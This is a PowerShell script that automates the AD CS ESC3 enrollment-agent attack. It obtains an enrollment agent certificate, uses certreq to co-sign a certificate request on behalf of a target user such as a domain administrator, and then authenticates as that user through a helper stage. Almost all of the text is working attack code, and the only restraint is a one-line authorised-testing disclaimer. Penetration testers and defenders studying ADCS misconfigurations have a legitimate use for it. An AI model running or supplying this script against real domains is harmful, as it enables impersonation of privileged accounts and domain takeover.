<#
.SYNOPSIS
    AD CS ESC3 - Enrollment Agent Chain (LOLBAS).
.DESCRIPTION
    Two-stage attack: obtain an enrollment agent certificate, then use it
    to request a certificate on behalf of another user.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER AgentTemplate
    Template with Certificate Request Agent EKU
.PARAMETER TargetTemplate
    Template to request on behalf of the target user
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC3.ps1 -CAConfig "polaris.zsec.red\corp-CA" -AgentTemplate "EnrollmentAgent" -TargetTemplate "User" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$AgentTemplate,
    [Parameter(Mandatory)] [string]$TargetTemplate,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC3 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC3" "Enrollment Agent Chain"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Agent Template  : $AgentTemplate" -ForegroundColor Gray
Write-Host "    [>] Target Template : $TargetTemplate" -ForegroundColor Gray
Write-Host "    [>] Target Identity : $TargetUPN" -ForegroundColor Gray
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: GET AGENT CERT
Write-Host ""
Write-Stage -Number 2 -Name "POSITIONING - Obtain Enrollment Agent"
$agentINF = New-CertRequestINF -Subject "CN=$env:USERNAME-Agent" -Template $AgentTemplate `
    -OutFile "$OutputDir\esc3-agent.inf" -Exportable
$agentResult = Invoke-CertRequest -INFFile $agentINF -CA $CAConfig -Prefix "esc3-agent"
if (-not $agentResult.Success) { Write-Stage -Number 2 -Name "POSITIONING" -Status 'FAILED'; exit 1 }
Write-Host "    [+] Enrollment agent certificate obtained" -ForegroundColor Green
Write-Stage -Number 2 -Name "POSITIONING" -Status 'COMPLETE'

# STAGE 3: REQUEST ON BEHALF
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST - On Behalf Of $TargetUPN"

$targetINF = New-CertRequestINF -Subject "CN=$TargetUPN" -Template $TargetTemplate `
    -OutFile "$OutputDir\esc3-target.inf" -Exportable
$targetReq = "$OutputDir\esc3-target.req"
$signedReq = "$OutputDir\esc3-signed.req"

certreq -new "$targetINF" "$targetReq" 2>&1 | Out-Null

Write-Host "    [>] Co-signing with enrollment agent certificate..." -ForegroundColor Gray
Write-Host "    [i] Select the enrollment agent cert when prompted" -ForegroundColor Yellow
certreq -sign "$targetReq" "$signedReq" 2>&1

$result = Invoke-CertRequest -RequestFile $signedReq -CA $CAConfig -Prefix "esc3-target"
if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [+] Certificate issued for $TargetUPN via enrollment agent" -ForegroundColor Green
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
